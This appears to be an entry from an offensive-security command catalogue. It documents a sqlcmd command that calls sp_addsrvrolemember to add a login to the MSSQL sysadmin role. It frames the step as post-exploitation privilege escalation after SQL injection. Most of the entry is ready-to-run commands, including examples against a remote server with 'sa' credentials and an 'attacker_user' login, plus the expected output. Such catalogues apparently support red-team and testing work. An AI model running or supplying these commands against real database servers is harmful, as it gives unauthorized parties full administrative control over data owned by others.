---
id: f01d99dd-8c7c-48c7-a891-fa1f56142ef1
name: mssql-add-user-to-sysadmin-role
type: command
executor: sqlcmd
data: 'EXEC master.dbo.sp_addsrvrolemember $_LOGIN_NAME, ''sysadmin'';'
output: null
created_at: '2023-04-06T03:56:34.073098+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - mssql
  - privilege-escalation
verified: true
validated: true
---

# mssql-add-user-to-sysadmin-role

## Command

```sqlcmd
sqlcmd -S $_SERVER -U $_USERNAME -P $_PASSWORD -Q "EXEC master.dbo.sp_addsrvrolemember '$_LOGIN_NAME', 'sysadmin';"
```

## Description

This command uses sqlcmd to connect to an MSSQL server and execute the sp_addsrvrolemember stored procedure, adding a specified login to the sysadmin fixed server role. Use this after gaining initial SQL execution (e.g., via injection) to escalate to full DBA privileges. Requires existing connection credentials with sufficient permissions to alter roles.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_SERVER | Target MSSQL server IP or hostname (default: localhost) | Yes |
| $_USERNAME | MSSQL username for connection | Yes |
| $_PASSWORD | Password for the connection username | Yes |
| $_LOGIN_NAME | The login name to add to sysadmin role (e.g., 'attacker_user') | Yes |
| -Q | Query execution mode (immediate execution) | Built-in |

## Examples

### Basic Usage

Add a user to sysadmin on a remote server:

```sqlcmd
sqlcmd -S 192.168.1.100 -U sa -P P@ssw0rd -Q "EXEC master.dbo.sp_addsrvrolemember 'attacker_user', 'sysadmin';"
```

### Usage with Local Server

```sqlcmd
sqlcmd -S localhost -U current_user -P current_pass -Q "EXEC master.dbo.sp_addsrvrolemember 'new_dba', 'sysadmin';"
```

## Expected Output

If successful: "The server principal '$_LOGIN_NAME' has been added as a member of the 'sysadmin' server role." followed by a 0 (success code). Errors may include "Login failed" or "Principal does not exist" if prerequisites fail.

## Related

- [[procedures/MSSQL-Injection-to-Grant-DBA-Access]]
- [[commands/sqlcmd-connect-with-new-user]]
